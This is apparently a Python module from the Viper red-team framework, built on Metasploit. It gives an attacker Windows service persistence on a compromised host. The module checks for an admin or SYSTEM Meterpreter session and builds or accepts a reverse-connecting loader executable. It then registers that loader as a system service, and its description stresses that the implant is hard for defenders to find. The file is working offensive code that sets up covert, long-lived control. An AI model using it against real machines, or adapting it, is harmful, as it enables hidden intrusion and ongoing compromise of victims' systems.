# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Windows系统服务持久化"
    DESC_ZH = "模块通过将上传的Payload文件注册为系统服务的方式进行持久化控制.\n" \
              "此模块需要Session系统权限或管理员权限.\n" \
              "服务持久化虽然在写入时无法免杀,但是成功写入口由于排查困难,隐蔽效果好.\n" \
              "当使用自定义loader时,需要为服务类型的exe.\n" \
              "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."

    NAME_EN = "Windows service persistence"
    DESC_EN = "The module performs persistence control by registering the uploaded Payload file as a system service.\n" \
              "This module requires Session system permissions or administrator permissions.\n" \
              "Although service persistence cannot bypass AV when writing, it has a good concealment effect due to difficulties in troubleshooting after successful writing.\n" \
              "When using the module, do not turn off the corresponding handler, the Loader needs to be connected back to the monitoring to obtain the core library files."

    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1050"]  # ATTCK向量
    AUTHOR = ["Viper"]
    README = ["https://www.yuque.com/vipersec/module/wqyzcf"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    OPTIONS = register_options([
        OptionHander(),
        OptionFileEnum(ext=['exe'], required=False),
        OptionCacheHanderConfig(),

    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_service_simple_api"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        # 检查权限
        if session.is_admin or session.is_system:
            pass
        else:
            return False, "当前Session必须拥有系统权限或管理员权限", "The current Session must have system permissions or administrator permissions"

        if 'windows' not in self.get_handler_payload().lower():
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        self.set_payload_by_handler()

        filepath = self.get_fileoption_filepath(msf=True)
        if filepath is None:  # 根据监听进行持久化
            exe_filepath = self.generate_bypass_exe_file(template="REVERSE_HEX_BASE")
        else:
            Notice.send_info("使用自定义的loader进行持久化", "Use custom loader for persistence")
            exe_filepath = filepath

        self.set_msf_option("EXE::Custom", exe_filepath)
        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"脚本输出: {data.get('psresult')}", f"Script output: {data.get('psresult')}")
            self.log_good(f"EXE路径: {data.get('victim_path')}", f"EXE path: {data.get('victim_path')}")
            self.cache_handler()
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
